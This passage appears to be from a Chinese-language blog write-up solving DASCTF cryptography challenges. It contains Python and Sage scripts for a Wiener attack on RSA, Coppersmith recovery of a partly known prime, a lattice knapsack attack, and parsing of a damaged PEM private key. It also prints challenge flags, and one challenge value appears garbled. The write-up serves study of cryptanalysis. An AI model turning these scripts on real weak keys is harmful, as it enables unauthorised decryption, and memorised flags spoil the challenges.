class="built_in">print</span>(m)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;8e5ee461-f4e1-4af2-8632-c9d62f4dc073&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="esyRSA"><a href="#esyRSA" class="headerlink" title="esyRSA"></a>esyRSA</h3><blockquote><p>好像这个RSA有点怪啊！私钥给你了！我的e呢？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> md5 <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> p, q</span><br><span class="line"></span><br><span class="line">e = ?????</span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">ans = gcd(e,phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> n, e, d</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Flag: DASCTF&#123;%s&#125;&quot;</span> %md5(<span class="built_in">str</span>(p + q)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">nspan></span><br><span class="line"><span class="string">d = 14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>$n$ 直接给得有问题，重复了一遍，巨坑。</p><p>正确的 $n=$80642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373</p><p>$n$ 与 $d$ 位数相近，$e$ 很小，Wiener Attack /爆破/求 $e$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">d = </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rational_to_contfrac</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="comment"># Converts a rational x/y fraction into a list of partial quotients [a0, ..., an]</span></span><br><span class="line">    a = x // y</span><br><span class="line">    pquotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        pquotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> pquotients</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents_from_contfrac</span>(<span class="params">frac</span>):</span><br><span class="line">    <span class="comment"># computes the list of convergents using the list of partial quotients</span></span><br><span class="line">    convs = [];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frac)): convs.append(contfrac_to_rational(frac[<span class="number">0</span> : i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contfrac_to_rational</span> (frac):</span><br><span class="line">    <span class="comment"># Converts a finite continued fraction [a0, ..., an] to an x/y rational.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(frac) == <span class="number">0</span>: <span class="keyword">return</span> (<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    num = frac[-<span class="number">1</span>]</span><br><span class="line">    denom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>, -<span class="built_in">len</span>(frac) - <span class="number">1</span>, -<span class="number">1</span>): num, denom = frac[_] * num + denom, num</span><br><span class="line">    <span class="keyword">return</span> (num, denom)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>: <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    g, x, y = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, _ = egcd(a, m)</span><br><span class="line">    <span class="keyword">return</span> (x + m) % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">    x = n</span><br><span class="line">    y = (x + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> y &lt; x:</span><br><span class="line">        x = y</span><br><span class="line">        y = (x + n // x) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_rsa</span>(<span class="params">e, n</span>):</span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if x*x - s*x + n = 0 has integer roots</span></span><br><span class="line">            D = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> D &gt;= <span class="number">0</span>:</span><br><span class="line">                sq = isqrt(D)</span><br><span class="line">                <span class="keyword">if</span> sq * sq == D <span class="keyword">and</span> (s + sq) % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">e = crack_rsa(d, n)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 13521</span></span><br></pre></td></tr></table></figure><p>再已知 $n,e,d$ 求 $p,q$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divide_pq</span>(<span class="params">e, d, n</span>):</span><br><span class="line">    k = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        g = random.randint(<span class="number">2</span>, n-<span class="number">1</span>)</span><br><span class="line">        t = k</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> t % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            t //= <span class="number">2</span></span><br><span class="line">            x = <span class="built_in">pow</span>(g, t, n)</span><br><span class="line">            <span class="keyword">if</span> x &gt; <span class="number">1</span> <span class="keyword">and</span> gmpy2.gcd(x-<span class="number">1</span>, n) &gt; <span class="number">1</span>:</span><br><span class="line">                p = gmpy2.gcd(x-<span class="number">1</span>, n)</span><br><span class="line">                <span class="keyword">return</span> (p, n//p)</span><br><span class="line"></span><br><span class="line">n = <span class="number">80642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373</span></span><br><span class="line">d = <span class="number">14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913</span></span><br><span class="line">e = <span class="number">13521</span></span><br><span class="line"></span><br><span class="line">p, q = divide_pq(e, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag: DASCTF&#123;%s&#125;&quot;</span> %md5(<span class="built_in">str</span>(p + q).encode()).hexdigest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Flag: DASCTF&#123;4ae33bea90f030bfddb7ac4d9222ef8f&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="MCeorpkpleer"><a href="#MCeorpkpleer" class="headerlink" title="MCeorpkpleer"></a>MCeorpkpleer</h3><blockquote><p>这数据都不全要怎么计算呢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params"><span class="built_in">list</span>, m, w</span>):</span><br><span class="line">    pubkey_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e_bin)):</span><br><span class="line">        pubkey_list.append(w * <span class="built_in">list</span>[i] % m)</span><br><span class="line">    <span class="keyword">return</span> pubkey_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e_cry</span>(<span class="params">e, pubkey</span>):</span><br><span class="line">    pubkey_list = pubkey</span><br><span class="line">    encode = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e)):</span><br><span class="line">        encode += pubkey_list[i] * <span class="built_in">int</span>(e[i]) % m</span><br><span class="line">    <span class="keyword">return</span> encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = getPrime(<span class="number">64</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line">e_bin = (<span class="built_in">bin</span>(e))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">list</span> = [<span class="built_in">pow</span>(<span class="number">3</span>, i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e_bin))]</span><br><span class="line">m = getPrime(<span class="built_in">len</span>(<span class="built_in">bin</span>(<span class="built_in">sum</span>(<span class="built_in">list</span>))) - <span class="number">1</span>)</span><br><span class="line">w = getPrime(<span class="number">64</span>)</span><br><span class="line">pubkey = pubkey(<span class="built_in">list</span>, m, w)</span><br><span class="line">en_e = e_cry(e_bin, pubkey)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p = &#123;&#125;\n&#x27;</span></span><br><span class="line">      <span class="string">&#x27;n = &#123;&#125;\n&#x27;</span></span><br><span class="line">      <span class="string">&#x27;c = &#123;&#125;\n&#x27;</span></span><br><span class="line">      <span class="string">&#x27;pubkey = &#123;&#125;\n&#x27;</span></span><br><span class="line">      <span class="string">&#x27;en_e = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>((p &gt;&gt; <span class="number">435</span>) &lt;&lt; <span class="number">435</span>, n, c, pubkey, en_e))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179655351110456639347861739783538289295071556484465877192913103980697449775104351723521120185802327587352171892429135110880845830815744</span></span><br><span class="line"><span class="string">n = 22687275367292715121023165106670108853938361902298846206862771935407158965874027802803638281495587478289987884478175402963651345721058971675312390474130344896656045501040131613951749912121302307319667377206302623735461295814304029815569792081676250351680394603150988291840152045153821466137945680377288968814340125983972875343193067740301088120701811835603840224481300390881804176310419837493233326574694092344562954466888826931087463507145512465506577802975542167456635224555763956520133324723112741833090389521889638959417580386320644108693480886579608925996338215190459826993010122431767343984393826487197759618771</span></span><br><span class="line"><span class="string">c = 156879727064293983713540449709354153986555741467040286464656817265584766312996642691830194777204718013294370729900795379967954637233360644687807499775502507899321601376211142933572536311131955278039722631021587570212889988642265055045777870448827343999745781892044969377246509539272350727171791700388478710290244365826497917791913803035343900620641430005143841479362493138179077146820182826098057144121231954895739989984846588790277051812053349488382941698352320246217038444944941841831556417341663611407424355426767987304941762716818718024107781873815837487744195004393262412593608463400216124753724777502286239464</span></span><br><span class="line"><span class="string">pubkey = [18143710780782459577, 54431132342347378731, 163293397027042136193, 489880191081126408579, 1469640573243379225737, 4408921719730137677211, 13226765159190413031633, 39680295477571239094899, 119040886432713717284697, 357122659298141151854091, 1071367977894423455562273, 3214103933683270366686819, 9642311801049811100060457, 28926935403149433300181371, 86780806209448299900544113, 260342418628344899701632339, 781027255885034699104897017, 2343081767655104097314691051, 7029245302965312291944073153, 21087735908895936875832219459, 63263207726687810627496658377, 189789623180063431882489975131, 569368869540190295647469925393, 1708106608620570886942409776179, 601827224419797931380408071500, 1805481673259393794141224214500, 893952418336266652976851386463, 2681857255008799958930554159389, 3523079163584485147344841221130, 1524252287869625983140881149316, 50264262166963219975822190911, 150792786500889659927466572733, 452378359502668979782399718199, 1357135078508006939347199154597, 4071405235524020818041597463791, 3169230503688232995231149877299, 462706308180869526799807117823, 1388118924542608580399421353469, 4164356773627825741198264060407, 3448085117999647764701149667147, 1299270151115113835209806487367, 3897810453345341505629419462101, 2648446157152195057994615872229, 3422845870014670444537026359650, 1223552407160181874717436564876, 3670657221480545624152309694628, 1966986461557807413563286569810, 1378466783231507511243038452393, 4135400349694522533729115357179, 3361215846199738142293703557463, 1038662335715384967987468158315, 3115987007146154903962404474945, 302975818554635252993570910761, 908927455663905758980712732283, 2726782366991717276942138196849, 3657854499533237101379593333510, 1928578295715881845245137486456, 1263242285705730806288591202331, 3789726857117192418865773606993, 2324195368467747797703678306905, 2450093503961328663664213663678, 2827787910442071261545819733997, 3960871129884299055190637944954, 2837628186769067706678271320788]</span></span><br><span class="line"><span class="string">en_e = 31087054322877663244023458448558</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>根据已知 $p$ 高位，用coppersmith算法恢复 $p$。</p><p>对于 $e$，已知 $s_i = w \cdot 3^i \bmod m$，已知 $3^i$ 和 $s_i$，未知 $w$ 和 $m$。</p><p>由 $\begin{cases} s_i = w \cdot 3^i \bmod m \newline s_{i+1} = w \cdot 3^{i+1} \bmod m \end{cases}$，即 $\begin{cases} w \cdot 3^i = s_i+k_1m \newline w \cdot 3^{i+1} = s_{i+1}+k_2m \end{cases}$，</p><p>两式相除，得 $(3s_i-s_{i+1})=(3k_1-k_2)m=km$，故求gcd可得 $m$，再按背包密码求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">ph = </span><br><span class="line">N = </span><br><span class="line">c = </span><br><span class="line">pk = [...]</span><br><span class="line">ec = </span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line">f = ph + x</span><br><span class="line">pl = f.small_roots(X=<span class="number">2</span>^<span class="number">435</span>, beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line">p = <span class="built_in">int</span>(ph+pl)</span><br><span class="line">q = N//p</span><br><span class="line"></span><br><span class="line">m = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pk)-<span class="number">1</span>):</span><br><span class="line">    m = gcd(m, <span class="number">3</span>*pk[i]-pk[i+<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">w = pk[<span class="number">0</span>]*inverse_mod(<span class="number">3</span>^<span class="number">0</span>,m)%m</span><br><span class="line"><span class="built_in">print</span>(w)</span><br><span class="line"></span><br><span class="line">ct =  ec</span><br><span class="line">n = <span class="built_in">len</span>(pk)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sanity check for application of low density attack</span></span><br><span class="line">d = n / log(<span class="built_in">max</span>(pk), <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(CDF(d))</span><br><span class="line"><span class="keyword">assert</span> CDF(d) &lt; <span class="number">0.9408</span></span><br><span class="line"></span><br><span class="line">M = Matrix.identity(n) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">last_row = [<span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> pk]</span><br><span class="line">M_last_row = Matrix(ZZ, <span class="number">1</span>, <span class="built_in">len</span>(last_row), last_row)</span><br><span class="line"></span><br><span class="line">last_col = pk</span><br><span class="line">last_col.append(ct)</span><br><span class="line">M_last_col = Matrix(ZZ, <span class="built_in">len</span>(last_col), <span class="number">1</span>, last_col)</span><br><span class="line"></span><br><span class="line">M = M.stack(M_last_row)</span><br><span class="line">M = M.augment(M_last_col)</span><br><span class="line"></span><br><span class="line">X = M.BKZ()</span><br><span class="line"></span><br><span class="line">sol = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>):</span><br><span class="line">    testrow = X.row(i).<span class="built_in">list</span>()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">set</span>(testrow).issubset([-<span class="number">1</span>, <span class="number">1</span>]):</span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> testrow:</span><br><span class="line">            <span class="keyword">if</span> v == <span class="number">1</span>:</span><br><span class="line">                sol.append(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">elif</span> v == -<span class="number">1</span>:</span><br><span class="line">                sol.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">s = sol</span><br><span class="line">e = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> s]),<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(e.bit_length())</span><br><span class="line"><span class="built_in">print</span>(is_prime(e))</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,N)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;DASCTF&#123;T81I_tPPS_6r7g_xlPi_OO3M_6vyV_Rkba&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="XOR贯穿始终"><a href="#XOR贯穿始终" class="headerlink" title="XOR贯穿始终"></a>XOR贯穿始终</h3><blockquote><p>一切都是有意义的，拿下它吧。</p></blockquote><p><code>massege.txt</code> 中为社会价值观编码，解码得压缩包密码：<code>C0ngr4tulati0n5_y0u_fou^d_m3</code>，注释：<code>钥匙先别扔掉，万一后面还有用呢</code>。</p><p><code>task.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> enflag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = q * p</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = getPrime(<span class="number">17</span>)</span><br><span class="line"><span class="keyword">assert</span> gcd(e, phi) == <span class="number">1</span></span><br><span class="line"><span class="comment"># 以上信息生成了私钥文件,但文件被损坏了你能提取有用信息吗</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(enflag, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>pri.pem</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALmtMy+2uH1ZtbIL</span><br><span class="line">SuiAukFthyQRH5mp7UmLyzZQkdg9zEP9/5tgffikQ7ytx5kHySHnazgAO1sOzmYE</span><br><span class="line">N4Axlev6uafiP8B1Eij97v5VkYJ1I9e3mtBNheTbXKoT8op+ASQ1fQaF4A8UzLuW</span><br><span class="line">eZeZI8JTH/SH+bolAK3kiZXDFdkTAgMBAAECgYEAl067LaC7Cvs2A5cMPhfYsESv</span><br><span class="line">IgcKN1CwW4Sd3u8dSphhgu7TgyzIuvwxbuo2g1BC6WwKhaI6vGN+csfw6nh98GEn</span><br><span class="line">/p3D0huNroAYvf/DRRB9UnHdttX7wB+Mv3P0RBDWHgBiCDVvHFuFUV78cIs0tnbn</span><br><span class="line">jxjU07aPV2XRC3AfA2ECQQDqWUNPVg3i6vTyHCL7EGkbeUheYpAAfcKCQrxjc5+5</span><br><span class="line">X6A+XtgHAA1JHwykPlCpHUOmlA85DJF1ejuoImzlgRLJAkEAytTCnQF+MN2r1gaA</span><br><span class="line">UETZyj5qMYT7Th8zKEVVVJjDawLnuX4usJ2FyRnjCkk86U75QSJhw5mMc0QnG25u</span><br><span class="line">Gz3++w==</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>按照私钥结构，将私钥base64解码转hex分析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">30820277</span> <span class="comment"># 多余部分</span></span><br><span class="line"></span><br><span class="line">0201 <span class="comment"># 多余部分</span></span><br><span class="line"><span class="number">00</span></span><br><span class="line"></span><br><span class="line">300d06092a864886f70d01010105000482 <span class="comment"># 多余部分</span></span><br><span class="line">0261</span><br><span class="line"></span><br><span class="line">3082025d <span class="comment"># 开始: 长度=0x025d</span></span><br><span class="line"></span><br><span class="line">0201 <span class="comment"># 版本：长度=0x01</span></span><br><span class="line"><span class="number">00</span></span><br><span class="line"></span><br><span class="line">028181 <span class="comment"># n：长度=0x81</span></span><br><span class="line">00b9ad332fb6b87d59b5b20b4ae880ba416d8724111f99a9ed498bcb365091d83dcc43fdff9b607df8a443bcadc79907c921e76b38003b5b0ece660437803195ebfab9a7e23fc0751228fdeefe5591827523d7b79ad04d85e4db5caa13f28a7e0124357d0685e00f14ccbb9679979923c2531ff487f9ba2500ade48995c315d913 <span class="comment"># n</span></span><br><span class="line"></span><br><span class="line">0203 <span class="comment"># e：长度=0x03</span></span><br><span class="line"><span class="number">0</span>10001 <span 